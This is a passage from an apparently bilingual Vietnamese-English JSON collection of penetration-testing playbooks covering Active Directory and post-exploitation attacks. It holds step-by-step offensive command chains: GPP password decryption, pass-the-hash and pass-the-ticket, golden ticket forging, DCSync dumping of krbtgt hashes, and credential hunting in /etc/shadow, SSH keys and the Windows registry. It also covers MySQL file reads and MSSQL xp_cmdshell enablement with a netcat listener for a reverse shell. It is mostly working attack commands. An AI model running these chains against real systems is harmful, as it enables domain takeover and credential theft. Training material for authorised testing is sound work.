    "content": "## Playbook 24: AD Attack - GPP Password Decryption üìúüîë\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ quy·ªÅn ƒë·ªçc SYSVOL v√† t√¨m th·∫•y `cpassword` trong file XML.\n\n**M·ª•c ti√™u:** Gi·∫£i m√£ `cpassword`.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Truy c·∫≠p v√† T√¨m ki·∫øm SYSVOL:**\n    * **T√¨m file XML:**\n      ```bash\n      # Tr√™n Kali\n      smbclient \\\\<DC_IP>\\SYSVOL -U '<domain>\\<user>%<pass>'\n      # B√™n trong smbclient:\n      cd <domain>\\Policies\\\n      recurse ON\n      prompt OFF\n      mget *.xml \n      exit\n      ```\n     \n    * **T√¨m `cpassword`:**\n      ```bash\n      grep -i cpassword *.xml \n      ```\n     \n    * **Ho·∫∑c d√πng CrackMapExec Module:**\n      ```bash\n      crackmapexec smb <DC_IP> -u <user> -p '<pass>' -M gpp_password \n      ```\n     \n2.  **Gi·∫£i m√£:**\n    ```bash\n    # Tr√™n Kali\n    gpp-decrypt \"<copied_cpassword_value>\" \n    ```\n   \n3.  **S·ª≠ d·ª•ng M·∫≠t kh·∫©u:** M·∫≠t kh·∫©u plaintext th∆∞·ªùng l√† c·ªßa local administrator.",
    "steps": [
      { "vi": "**Truy c·∫≠p SYSVOL v√† t·∫£i XML (smbclient):**", "en": "**Access SYSVOL and download XML (smbclient):**", "command": "smbclient \\\\<DC_IP>\\SYSVOL -U '<domain>\\<user>%<pass>' -c 'cd <domain>\\Policies\\; recurse ON; prompt OFF; mget *.xml; exit'" },
      { "vi": "**T√¨m `cpassword` (grep):**", "en": "**Find `cpassword` (grep):**", "command": "grep -i cpassword *.xml" },
      { "vi": "**Ho·∫∑c T√¨m `cpassword` (CrackMapExec):**", "en": "**Or Find `cpassword` (CrackMapExec):**", "command": "crackmapexec smb <DC_IP> -u <user> -p '<pass>' -M gpp_password" },
      { "vi": "**Gi·∫£i m√£ (gpp-decrypt):**", "en": "**Decrypt (gpp-decrypt):**", "command": "gpp-decrypt \"<copied_cpassword_value>\"" },
      { "vi": "**S·ª≠ d·ª•ng M·∫≠t kh·∫©u.**", "en": "**Use Password.**" }
    ],
    "related_knowledge_ids": ["ad_attack_gpp_cpassword", "smbclient", "ad_enum_domain_shares_gpp", "grep", "gpp-decrypt", "crackmapexec"]
  },
  "playbook_25_ad_lateral_pth": {
    "title": {
      "vi": "Playbook 25: AD Lateral Movement - Pass the Hash (PtH)",
      "en": "Playbook 25: AD Lateral Movement - Pass the Hash (PtH)"
    },
    "assumption": "ƒê√£ dump ƒë∆∞·ª£c NTLM hash c·ªßa m·ªôt user (v√≠ d·ª•: Administrator, Domain Admin, ho·∫∑c user c√≥ quy·ªÅn Local Admin tr√™n m√°y m·ª•c ti√™u) t·ª´ LSASS/SAM/NTDS.dit. M√°y m·ª•c ti√™u c√≥ SMB (445) ho·∫∑c WinRM (5985) m·ªü v√† c√≥ th·ªÉ truy c·∫≠p ƒë∆∞·ª£c (c√≥ th·ªÉ c·∫ßn pivot).",
    "objective": "Gi√†nh quy·ªÅn truy c·∫≠p shell tr√™n m√°y m·ª•c ti√™u b·∫±ng NTLM hash.",
    "tools": ["impacket-psexec", "impacket-wmiexec", "evil-winrm", "mimikatz"],
    "phases": ["Lateral Movement"],
    "techniques": ["Pass the Hash (PtH)"],
    "targets": ["Windows Machine"],
    "os": ["Windows"],
    "tags": ["ad", "active directory", "lateral movement", "pass the hash", "pth", "ntlm hash", "impacket", "psexec", "wmiexec", "evil-winrm", "mimikatz"],
    "content": "## Playbook 25: AD Lateral Movement - Pass the Hash (PtH) üö∂‚Äç‚ôÇÔ∏èüîë‚û°Ô∏èüíª\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ NTLM hash v√† m√°y m·ª•c ti√™u c√≥ SMB/WinRM m·ªü, truy c·∫≠p ƒë∆∞·ª£c.\n\n**M·ª•c ti√™u:** Gi√†nh shell tr√™n m√°y m·ª•c ti√™u b·∫±ng hash.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Ch·ªçn C√¥ng c·ª• v√† Giao th·ª©c:**\n    * **Psexec (SMB - SYSTEM shell):**\n      ```bash\n      impacket-psexec -hashes <LMHash>:<NTHash> <domain>/<user>@<target_ip>\n      ```\n    * **Wmiexec (WMI - user shell):**\n      ```bash\n      impacket-wmiexec -hashes <LMHash>:<NTHash> <domain>/<user>@<target_ip>\n      ```\n    * **Evil-WinRM (WinRM):**\n      ```bash\n      evil-winrm -i <target_ip> -u <user> -H <NTHash>\n      ```\n    * **Mimikatz (T·ª´ Windows kh√°c):**\n      ```powershell\n      privilege::debug\n      sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTHash> /run:cmd.exe\n      dir \\\\<target_ip>\\C$\n      ```\n   \n2.  **Th·ª±c thi L·ªánh / L·∫•y Shell.**\n3.  **X√°c nh·∫≠n Quy·ªÅn Truy c·∫≠p.**",
    "steps": [
      { "vi": "**PtH v·ªõi Psexec (SMB):**", "en": "**PtH with Psexec (SMB):**", "command": "impacket-psexec -hashes <LMHash>:<NTHash> <domain>/<user>@<target_ip>" },
      { "vi": "**PtH v·ªõi Wmiexec (WMI):**", "en": "**PtH with Wmiexec (WMI):**", "command": "impacket-wmiexec -hashes <LMHash>:<NTHash> <domain>/<user>@<target_ip>" },
      { "vi": "**PtH v·ªõi Evil-WinRM (WinRM):**", "en": "**PtH with Evil-WinRM (WinRM):**", "command": "evil-winrm -i <target_ip> -u <user> -H <NTHash>" },
      { "vi": "**PtH v·ªõi Mimikatz (Windows):**", "en": "**PtH with Mimikatz (Windows):**", "command": "privilege::debug; sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTHash> /run:cmd.exe" },
      { "vi": "**X√°c nh·∫≠n Quy·ªÅn Truy c·∫≠p.**", "en": "**Confirm Access.**" }
    ],
    "related_knowledge_ids": ["pass_the_hash", "impacket-psexec", "impacket-wmiexec", "password_cracking_pass_the_hash", "evil_winrm_connection", "mimikatz"]
  },
  "playbook_26_ad_lateral_ptt": {
    "title": {
      "vi": "Playbook 26: AD Lateral Movement - Pass the Ticket (PtT)",
      "en": "Playbook 26: AD Lateral Movement - Pass the Ticket (PtT)"
    },
    "assumption": "ƒê√£ dump ƒë∆∞·ª£c Kerberos ticket (TGT ho·∫∑c TGS, th∆∞·ªùng l√† file `.kirbi`) t·ª´ LSASS (d√πng Mimikatz `sekurlsa::tickets /export`).",
    "objective": "S·ª≠ d·ª•ng Kerberos ticket ƒë√£ ƒë√°nh c·∫Øp ƒë·ªÉ x√°c th·ª±c v√† gi√†nh quy·ªÅn truy c·∫≠p.",
    "tools": ["mimikatz", "Rubeus"],
    "phases": ["Lateral Movement"],
    "techniques": ["Pass the Ticket (PtT)", "Kerberos Attack"],
    "targets": ["Windows Machine", "Kerberos Services (SMB, HTTP, etc.)"],
    "os": ["Windows"],
    "tags": ["ad", "active directory", "lateral movement", "pass the ticket", "ptt", "kerberos", "kirbi", "mimikatz", "rubeus"],
    "content": "## Playbook 26: AD Lateral Movement - Pass the Ticket (PtT) üö∂‚Äç‚ôÇÔ∏èüé´‚û°Ô∏èüíª\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ Kerberos ticket file (`.kirbi`).\n\n**M·ª•c ti√™u:** S·ª≠ d·ª•ng ticket ƒë·ªÉ x√°c th·ª±c.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Chuy·ªÉn Ticket:** T·∫£i file `.kirbi` l√™n m√°y Windows m√† b·∫°n ƒëang c√≥ shell.\n2.  **Ti√™m Ticket (Mimikatz):**\n    ```powershell\n    kerberos::ptt C:\\path\\to\\ticket.kirbi \n    ```\n   \n3.  **Ti√™m Ticket (Rubeus - Base64):**\n    ```powershell\n    .\\Rubeus.exe ptt /ticket:<base64_ticket_string> \n    ```\n   \n4.  **X√°c minh Ticket:** `klist`.\n5.  **Truy c·∫≠p T√†i nguy√™n:** S·ª≠ d·ª•ng ticket ƒë√£ ti√™m (v√≠ d·ª•: `dir \\\\<server>\\C$`).",
    "steps": [
      { "vi": "**Chuy·ªÉn Ticket (.kirbi) l√™n Target.**", "en": "**Transfer Ticket (.kirbi) to Target.**" },
      { "vi": "**Ti√™m Ticket (Mimikatz):**", "en": "**Inject Ticket (Mimikatz):**", "command": "kerberos::ptt C:\\path\\to\\ticket.kirbi" },
      { "vi": "**Ti√™m Ticket (Rubeus - Base64):**", "en": "**Inject Ticket (Rubeus - Base64):**", "command": ".\\Rubeus.exe ptt /ticket:<base64_ticket_string>" },
      { "vi": "**X√°c minh Ticket:**", "en": "**Verify Ticket:**", "command": "klist" },
      { "vi": "**Truy c·∫≠p T√†i nguy√™n:** (v√≠ d·ª•)", "en": "**Access Resource:** (example)", "command": "dir \\\\<target_server>\\C$" }
    ],
    "related_knowledge_ids": ["pass_the_ticket", "ad_attack_pass_the_ticket", "mimikatz", "kerberos::ptt", "Rubeus", "klist", "overpass_the_hash"]
  },
  "playbook_27_ad_persistence_golden_ticket": {
    "title": {
      "vi": "Playbook 27: AD Persistence - Golden Ticket",
      "en": "Playbook 27: AD Persistence - Golden Ticket"
    },
    "assumption": "ƒê√£ c√≥ NTLM hash c·ªßa t√†i kho·∫£n `krbtgt` (th∆∞·ªùng l·∫•y ƒë∆∞·ª£c qua DCSync ho·∫∑c dump NTDS.dit t·ª´ DC). Bi·∫øt Domain Name v√† Domain SID.",
    "objective": "T·∫°o m·ªôt Kerberos TGT gi·∫£ m·∫°o (Golden Ticket) ƒë·ªÉ c√≥ th·ªÉ m·∫°o danh b·∫•t k·ª≥ user n√†o trong domain v√† duy tr√¨ quy·ªÅn truy c·∫≠p.",
    "tools": ["mimikatz", "whoami"],
    "phases": ["Persistence", "Privilege Escalation"],
    "techniques": ["Golden Ticket", "Kerberos Attack"],
    "targets": ["Active Directory Domain"],
    "os": ["Windows"],
    "tags": ["ad", "active directory", "persistence", "golden ticket", "kerberos", "tgt", "krbtgt", "ntlm hash", "mimikatz", "dcsync"],
    "content": "## Playbook 27: AD Persistence - Golden Ticket üé´üëë\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ NTLM hash c·ªßa `krbtgt`, bi·∫øt Domain Name v√† SID.\n\n**M·ª•c ti√™u:** T·∫°o Golden Ticket ƒë·ªÉ duy tr√¨ quy·ªÅn truy c·∫≠p DA.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Thu th·∫≠p Th√¥ng tin:** krbtgt Hash, Domain Name, Domain SID (`whoami /user`).\n2.  **Ch·∫°y Mimikatz (Admin).**\n3.  **X√≥a Tickets c≈© (T√πy ch·ªçn):** `kerberos::purge`.\n4.  **T·∫°o v√† Ti√™m Golden Ticket:**\n    ```powershell\n    kerberos::golden /user:FakeAdmin /domain:<domain.local> /sid:<DomainSID> /krbtgt:<krbtgt_NTHash> /ptt \n    ```\n   \n5.  **X√°c minh Ticket:** `klist`.\n6.  **Truy c·∫≠p T√†i nguy√™n:** `dir \\\\<DC_IP>\\C$ `.",
    "steps": [
      { "vi": "**Thu th·∫≠p Th√¥ng tin:** krbtgt Hash, Domain Name, Domain SID.", "en": "**Gather Information:** krbtgt Hash, Domain Name, Domain SID.", "command": "whoami /user" },
      { "vi": "**Ch·∫°y Mimikatz (Admin).**", "en": "**Run Mimikatz (Admin).**" },
      { "vi": "**X√≥a Tickets c≈© (T√πy ch·ªçn):**", "en": "**Purge Old Tickets (Optional):**", "command": "kerberos::purge" },
      { "vi": "**T·∫°o v√† Ti√™m Golden Ticket:**", "en": "**Create and Inject Golden Ticket:**", "command": "kerberos::golden /user:FakeAdmin /domain:<domain.local> /sid:<DomainSID> /krbtgt:<krbtgt_NTHash> /ptt" },
      { "vi": "**X√°c minh Ticket:**", "en": "**Verify Ticket:**", "command": "klist" },
      { "vi": "**Truy c·∫≠p T√†i nguy√™n:** (v√≠ d·ª•)", "en": "**Access Resource:** (example)", "command": "dir \\\\<DC_IP>\\C$" }
    ],
    "related_knowledge_ids": ["golden_ticket", "ad_attack_golden_ticket", "mimikatz", "dcsync", "whoami /user", "ad_attack_silver_ticket_ad", "kerberos::purge", "kerberos::golden", "klist", "ad_attack_pass_the_ticket", "overpass_the_hash"]
  },
  "playbook_28_ad_compromise_dcsync": {
    "title": {
      "vi": "Playbook 28: AD Domain Compromise via DCSync",
      "en": "Playbook 28: AD Domain Compromise via DCSync"
    },
    "assumption": "ƒê√£ c√≥ quy·ªÅn c·ªßa m·ªôt user thu·ªôc nh√≥m c√≥ quy·ªÅn Directory Replication (th∆∞·ªùng l√† Domain Admins, Enterprise Admins, Administrators, ho·∫∑c user ƒë∆∞·ª£c ·ªßy quy·ªÅn ƒë·∫∑c bi·ªát).",
    "objective": "S·ª≠ d·ª•ng DCSync ƒë·ªÉ dump NTLM hash c·ªßa c√°c t√†i kho·∫£n quan tr·ªçng (ƒë·∫∑c bi·ªát l√† `krbtgt`) t·ª´ Domain Controller.",
    "tools": ["mimikatz", "impacket-secretsdump"],
    "phases": ["Credential Access", "Privilege Escalation"],
    "techniques": ["DCSync", "Directory Replication Abuse"],
    "targets": ["Domain Controller", "Active Directory Accounts"],
    "os": ["Windows", "Any"],
    "tags": ["ad", "active directory", "dcsync", "replication", "credential dumping", "ntlm hash", "krbtgt", "mimikatz", "impacket-secretsdump", "domain admin"],
    "content": "## Playbook 28: AD Domain Compromise via DCSync üîëüè∞\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ quy·ªÅn Replication.\n\n**M·ª•c ti√™u:** Dump hash (ƒë·∫∑c bi·ªát l√† `krbtgt`) t·ª´ DC.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c nh·∫≠n Quy·ªÅn.**\n2.  **Th·ª±c hi·ªán DCSync (Mimikatz):**\n    ```powershell\n    lsadump::dcsync /domain:<domain.local> /user:krbtgt \n    ```\n   \n3.  **Th·ª±c hi·ªán DCSync (impacket-secretsdump):**\n    ```bash\n    impacket-secretsdump <domain.local>/<UserWithRights>:<Password>@<DC_IP> -just-dc-user krbtgt \n    ```\n   \n4.  **L∆∞u Hash.**\n5.  **S·ª≠ d·ª•ng Hash:** Golden Ticket (Playbook 27) ho·∫∑c PtH (Playbook 25).",
    "steps": [
      { "vi": "**X√°c nh·∫≠n Quy·ªÅn Replication.**", "en": "**Confirm Replication Rights.**" },
      { "vi": "**Th·ª±c hi·ªán DCSync (Mimikatz):** (Dump krbtgt)", "en": "**Perform DCSync (Mimikatz):** (Dump krbtgt)", "command": "lsadump::dcsync /domain:<domain.local> /user:krbtgt" },
      { "vi": "**Th·ª±c hi·ªán DCSync (impacket-secretsdump):** (Dump krbtgt)", "en": "**Perform DCSync (impacket-secretsdump):** (Dump krbtgt)", "command": "impacket-secretsdump <domain.local>/<UserWithRights>:<Password>@<DC_IP> -just-dc-user krbtgt" },
      { "vi": "**L∆∞u Hash.**", "en": "**Save Hashes.**" },
      { "vi": "**S·ª≠ d·ª•ng Hash:** Golden Ticket (Playbook 27) ho·∫∑c PtH (Playbook 25).", "en": "**Use Hashes:** Golden Ticket (Playbook 27) or PtH (Playbook 25)." }
    ],
    "related_knowledge_ids": ["dcsync", "ad_attack_dcsync", "mimikatz", "lsadump::dcsync", "mimikatz_dcsync", "impacket-secretsdump", "ad_attack_dump_ntdsdit"]
  },
  "playbook_29_postex_linux_creds": {
    "title": {
      "vi": "Playbook 29: Linux Post-Exploitation - Credential Hunting Focus",
      "en": "Playbook 29: Linux Post-Exploitation - Credential Hunting Focus"
    },
    "assumption": "ƒê√£ c√≥ quy·ªÅn root tr√™n m√°y Linux.",
    "objective": "T√¨m ki·∫øm chuy√™n s√¢u c√°c credentials (m·∫≠t kh·∫©u plaintext, hash, kh√≥a SSH) ƒë·ªÉ di chuy·ªÉn ngang.",
    "tools": ["grep", "find", "cat", "history"],
    "phases": ["Post Exploitation", "Credential Access"],
    "techniques": ["Credential Hunting"],
    "targets": ["Configuration Files", "Shell History", "SSH Keys", "/etc/shadow"],
    "os": ["Linux"],
    "tags": ["linux", "post exploitation", "credential hunting", "grep", "find", "history", "ssh keys", "etc/shadow", "plaintext password"],
    "content": "## Playbook 29: Linux Post-Exploitation - Credential Hunting Focus üïµÔ∏è‚Äç‚ôÇÔ∏èüîë\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ quy·ªÅn root tr√™n Linux.\n\n**M·ª•c ti√™u:** T√¨m ki·∫øm credentials ƒë·ªÉ di chuy·ªÉn ngang.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **T√¨m M·∫≠t kh·∫©u Plaintext:**\n    ```bash\n    grep -rliE 'password|pass=|pwd=|secret' /etc /var/www /opt /home /root 2>/dev/null \n    find / -name '*.conf' -o -name '*.ini' ... -exec grep -HiE 'password|pass=|pwd=' {} \\; 2>/dev/null\n    ```\n   \n2.  **Ki·ªÉm tra L·ªãch s·ª≠ Shell:**\n    ```bash\n    history; cat /root/.bash_history; cat /home/*/.bash_history; ... \n    ```\n   \n3.  **Thu th·∫≠p Hashes:**\n    ```bash\n    cat /etc/shadow \n    ```\n   \n4.  **T√¨m Kh√≥a SSH:**\n    ```bash\n    find /root /home -name 'id_rsa*' -o -name 'authorized_keys' 2>/dev/null \n    ```\n   \n5.  **Ki·ªÉm tra Bi·∫øn M√¥i tr∆∞·ªùng:** `env`.",
    "steps": [
      { "vi": "**T√¨m M·∫≠t kh·∫©u Plaintext (grep):**", "en": "**Find Plaintext Passwords (grep):**", "command": "grep -rliE 'password|pass=|pwd=|secret' /etc /var/www /opt /home /root 2>/dev/null" },
      { "vi": "**T√¨m M·∫≠t kh·∫©u Plaintext (find + grep):**", "en": "**Find Plaintext Passwords (find + grep):**", "command": "find / \\( -name '*.conf' -o -name '*.ini' -o -name '*.xml' -o -name '*.php' \\) -exec grep -HiE 'password|pass=|pwd=' {} \\; 2>/dev/null" }, // S·ª≠a c√∫ ph√°p find
      { "vi": "**Ki·ªÉm tra L·ªãch s·ª≠ Shell:**", "en": "**Check Shell History:**", "command": "history; cat /root/.bash_history; cat /home/*/.bash_history; cat /home/*/.mysql_history; cat /home/*/.nano_history; cat /home/*/.viminfo" },
      { "vi": "**Thu th·∫≠p Hashes:**", "en": "**Collect Hashes:**", "command": "cat /etc/shadow" },
      { "vi": "**T√¨m Kh√≥a SSH:**", "en": "**Find SSH Keys:**", "command": "find /root /home -name 'id_rsa*' -o -name 'authorized_keys' 2>/dev/null" },
      { "vi": "**Ki·ªÉm tra Bi·∫øn M√¥i tr∆∞·ªùng:**", "en": "**Check Environment Variables:**", "command": "env" }
    ],
    "related_knowledge_ids": ["post_exploitation_windows_recon", "grep", "find", "history", "linux_important_locations_users_auth", "linux_important_locations_user_history_config", "cat /etc/shadow", "linuxprivesc_manual_password_loot", "password_cracking_ssh_key_passphrase", "ssh2john", "john", "linuxprivesc_sensitive_info_enum", "env"]
  },
  "playbook_30_postex_windows_creds": {
    "title": {
      "vi": "Playbook 30: Windows Post-Exploitation - Credential Hunting Focus",
      "en": "Playbook 30: Windows Post-Exploitation - Credential Hunting Focus"
    },
    "assumption": "ƒê√£ c√≥ quy·ªÅn Administrator/SYSTEM tr√™n m√°y Windows.",
    "objective": "T√¨m ki·∫øm chuy√™n s√¢u c√°c credentials (plaintext, hash, tickets) ƒë·ªÉ di chuy·ªÉn ngang.",
    "tools": ["mimikatz", "reg", "findstr", "Get-ChildItem", "cmdkey", "impacket-secretsdump"],
    "phases": ["Post Exploitation", "Credential Access"],
    "techniques": ["Credential Dumping", "Registry Searching", "File Searching"],
    "targets": ["LSASS", "SAM", "Registry", "Configuration Files", "Kerberos Tickets"],
    "os": ["Windows"],
    "tags": ["windows", "post exploitation", "credential hunting", "mimikatz", "registry", "findstr", "get-childitem", "cmdkey", "secretsdump", "plaintext password", "ntlm hash", "kerberos tickets"],
    "content": "## Playbook 30: Windows Post-Exploitation - Credential Hunting Focus üïµÔ∏è‚Äç‚ôÄÔ∏èüîë\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ quy·ªÅn Admin/SYSTEM tr√™n Windows.\n\n**M·ª•c ti√™u:** T√¨m ki·∫øm credentials ƒë·ªÉ di chuy·ªÉn ngang.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Dump t·ª´ LSASS/SAM (Mimikatz):** (Xem Playbook 20).\n2.  **T√¨m M·∫≠t kh·∫©u Plaintext trong Registry:**\n    ```powershell\n    reg query HKLM /f password /t REG_SZ /s \n    reg query HKCU /f password /t REG_SZ /s \n    # Ki·ªÉm tra key c·ª• th·ªÉ...\n    ```\n   \n3.  **T√¨m M·∫≠t kh·∫©u Plaintext trong Files:**\n    ```powershell\n    findstr /spin \"password\" C:\\*.* /L \n    # T√¨m file config c·ª• th·ªÉ...\n    Get-ChildItem -Path C:\\ ... | Select-String ...\n    ```\n   \n4.  **Ki·ªÉm tra Credential Manager:** `cmdkey /list`.\n5.  **Ki·ªÉm tra PowerShell History/Transcripts:** ...\n6.  **Dump SAM/SYSTEM Offline:** ...", // Content r√∫t g·ªçn
    "steps": [
      { "vi": "**Dump t·ª´ LSASS/SAM (Mimikatz):** (Xem Playbook 20).", "en": "**Dump from LSASS/SAM (Mimikatz):** (See Playbook 20)." },
      { "vi": "**T√¨m Creds trong Registry (HKLM):**", "en": "**Find Creds in Registry (HKLM):**", "command": "reg query HKLM /f password /t REG_SZ /s" },
      { "vi": "**T√¨m Creds trong Registry (HKCU):**", "en": "**Find Creds in Registry (HKCU):**", "command": "reg query HKCU /f password /t REG_SZ /s" },
      { "vi": "**Ki·ªÉm tra Registry Keys c·ª• th·ªÉ:** (Winlogon, Putty, VNC)", "en": "**Check Specific Registry Keys:** (Winlogon, Putty, VNC)" },
      { "vi": "**T√¨m Creds trong Files (findstr):**", "en": "**Find Creds in Files (findstr):**", "command": "findstr /spin \"password\" C:\\*.* /L" },
      { "vi": "**T√¨m Creds trong Files (PowerShell):**", "en": "**Find Creds in Files (PowerShell):**", "command": "Get-ChildItem -Path C:\\ -Include *.kdbx,*.config,*.ini,*.xml,*.txt -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password','pass','pwd','secret'" },
      { "vi": "**Ki·ªÉm tra Credential Manager:**", "en": "**Check Credential Manager:**", "command": "cmdkey /list" },
      { "vi": "**Ki·ªÉm tra PowerShell History/Transcripts.**", "en": "**Check PowerShell History/Transcripts.**" },
      { "vi": "**Dump SAM/SYSTEM Offline (n·∫øu ch∆∞a l√†m):** (Xem Playbook 19).", "en": "**Dump SAM/SYSTEM Offline (if not done):** (See Playbook 19)." }
    ],
    "related_knowledge_ids": ["playbook_20_windows_postex_mimikatz", "reg query", "winprivesc_password_hunting_registry", "findstr", "winprivesc_password_hunting_files", "post_exploitation_windows_recon", "Get-ChildItem", "cmdkey", "winprivesc_runas_savedcreds", "playbook_19_windows_privesc_sam_backup"] // ƒê√£ s·ª≠a tham chi·∫øu
  },
  "playbook_31_foothold_mysql_loadfile": {
    "title": {
      "vi": "Playbook 31: Foothold qua MySQL (Port 3306) - ƒê·ªçc File",
      "en": "Playbook 31: Foothold via MySQL (Port 3306) - File Read"
    },
    "assumption": "Ph√°t hi·ªán Port 3306 (MySQL/MariaDB) m·ªü. C√≥ credentials h·ª£p l·ªá (t·ª´ brute-force ho·∫∑c ngu·ªìn kh√°c).",
    "objective": "S·ª≠ d·ª•ng quy·ªÅn truy c·∫≠p MySQL ƒë·ªÉ ƒë·ªçc c√°c file nh·∫°y c·∫£m tr√™n h·ªá th·ªëng.",
    "tools": ["mysql", "nmap", "hydra"],
    "phases": ["Initial Foothold", "Enumeration"],
    "techniques": ["Database Interaction", "File Read"],
    "targets": ["MySQL", "MariaDB", "Linux Filesystem", "Windows Filesystem"], // Added Windows Filesystem
    "os": ["Any (Server OS)"],
    "tags": ["foothold", "mysql", "mariadb", "port_3306", "file read", "load_file", "enumeration", "database"],
    "content": "## Playbook 31: Foothold qua MySQL (Port 3306) - ƒê·ªçc File üö™üîë‚û°Ô∏èüìÑ\n\n**Gi·∫£ ƒë·ªãnh:** MySQL (3306) m·ªü, c√≥ credentials h·ª£p l·ªá.\n\n**M·ª•c ti√™u:** ƒê·ªçc file h·ªá th·ªëng qua MySQL.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c nh·∫≠n D·ªãch v·ª• & L·∫•y Creds (N·∫øu ch∆∞a c√≥):**\n    * `nmap -sV -p 3306 --script=mysql-info,mysql-enum <target_ip>`.\n    * `hydra -L users.txt -P passwords.txt <target_ip> mysql`.\n2.  **K·∫øt n·ªëi MySQL:** `mysql -u <user> -p'<password>' -h <target_ip>`.\n3.  **Th·ª≠ ƒë·ªçc File:**\n    ```sql\n    SELECT LOAD_FILE('/etc/passwd');\n    SELECT LOAD_FILE('/home/<user>/.ssh/id_rsa');\n    SELECT LOAD_FILE('C:/Users/Admin/Desktop/passwords.txt'); -- Windows Path\n    ```\n   \n4.  **Ph√¢n t√≠ch File:** L∆∞u l·∫°i n·ªôi dung.",
    "steps": [
      { "vi": "**Scan & Brute (N·∫øu c·∫ßn):**", "en": "**Scan & Brute (If needed):**", "command": "nmap -sV -p 3306 --script=mysql-info,mysql-enum <target_ip>; hydra -L users.txt -P passwords.txt <target_ip> mysql" },
      { "vi": "**K·∫øt n·ªëi MySQL:**", "en": "**Connect MySQL:**", "command": "mysql -u <user> -p'<password>' -h <target_ip>" },
      { "vi": "**ƒê·ªçc File Linux (V√≠ d·ª•):**", "en": "**Read Linux File (Example):**", "command": "SELECT LOAD_FILE('/etc/passwd');" },
      { "vi": "**ƒê·ªçc File Windows (V√≠ d·ª•):**", "en": "**Read Windows File (Example):**", "command": "SELECT LOAD_FILE('C:/Users/Admin/Desktop/passwords.txt');" }
    ],
    "related_knowledge_ids": ["port_3306", "mysql", "nmap", "hydra", "sqli_theory_connection"]
  },
  "playbook_32_foothold_mssql_xpcmdshell": {
    "title": {
      "vi": "Playbook 32: Foothold qua MSSQL (Port 1433) - xp_cmdshell RCE",
      "en": "Playbook 32: Foothold via MSSQL (Port 1433) - xp_cmdshell RCE"
    },
    "assumption": "Ph√°t hi·ªán Port 1433 (MSSQL) m·ªü. C√≥ credentials h·ª£p l·ªá (t·ª´ brute-force ho·∫∑c ngu·ªìn kh√°c) c√≥ quy·ªÅn b·∫≠t v√† s·ª≠ d·ª•ng `xp_cmdshell` (th∆∞·ªùng l√† 'sa' ho·∫∑c t∆∞∆°ng ƒë∆∞∆°ng).",
    "objective": "S·ª≠ d·ª•ng `xp_cmdshell` ƒë·ªÉ th·ª±c thi l·ªánh h·ªá th·ªëng v√† gi√†nh reverse shell.",
    "tools": ["nmap", "hydra", "impacket-mssqlclient", "msfconsole (auxiliary/scanner/mssql/mssql_login)", "nc"],
    "phases": ["Initial Foothold", "Exploitation"],
    "techniques": ["Database Interaction", "RCE", "xp_cmdshell", "Reverse Shell"],
    "targets": ["MSSQL", "Windows OS"],
    "os": ["Windows"],
    "tags": ["foothold", "mssql", "port_1433", "rce", "xp_cmdshell", "reverse shell", "impacket-mssqlclient", "hydra"],
    "content": "## Playbook 32: Foothold qua MSSQL (Port 1433) - xp_cmdshell RCE üö™üîë‚û°Ô∏èüíª‚û°Ô∏èüêö\n\n**Gi·∫£ ƒë·ªãnh:** MSSQL (1433) m·ªü, c√≥ creds ƒë·∫∑c quy·ªÅn ('sa').\n\n**M·ª•c ti√™u:** RCE qua `xp_cmdshell` ƒë·ªÉ l·∫•y reverse shell.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c nh·∫≠n D·ªãch v·ª• & L·∫•y Creds (N·∫øu ch∆∞a c√≥):**\n    * `nmap -p 1433 -sV <target_ip>`.\n    * `hydra -L users.txt -P passwords.txt <target_ip> mssql`.\n    * `msfconsole -qx \"... mssql_login ...\"`.\n2.  **K·∫øt n·ªëi MSSQL:**\n    ```bash\n    impacket-mssqlclient <domain>/<user>:<password>@<target_ip> -windows-auth \n    impacket-mssqlclient sa:<password>@<target_ip> \n    ```\n   \n3.  **B·∫≠t xp_cmdshell (N·∫øu c·∫ßn):**\n    ```sql\n    EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\n    EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n    ```\n   \n4.  **Ki·ªÉm tra Th·ª±c thi L·ªánh:** `EXEC xp_cmdshell 'whoami';`.\n5.  **L·∫•y Reverse Shell:** M·ªü Listener `rlwrap nc -lvnp 4444`. Th·ª±c thi payload `powershell -e ...`.",
    "steps": [
      { "vi": "**Scan & Brute (N·∫øu c·∫ßn):**", "en": "**Scan & Brute (If needed):**", "command": "nmap -p 1433 <target_ip>; hydra -L u.txt -P p.txt <target_ip> mssql" },
      { "vi": "**K·∫øt n·ªëi (SQL Auth):**", "en": "**Connect (SQL Auth):**", "command": "impacket-mssqlclient sa:<password>@<target_ip>" },
      { "vi": "**K·∫øt n·ªëi (Windows Auth):**", "en": "**Connect (Windows Auth):**", "command": "impacket-mssqlclient <domain>/<user>:<password>@<target_ip> -windows-auth" },
      { "vi": "**B·∫≠t xp_cmdshell:**", "en": "**Enable xp_cmdshell:**", "command": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;" },
      { "vi": "**Ki·ªÉm tra l·ªánh:**", "en": "**Test command:**", "command": "EXEC xp_cmdshell 'whoami';" },
      { "vi": "**M·ªü Listener:**", "en": "**Start Listener:**", "command": "rlwrap nc -lvnp 4444" },
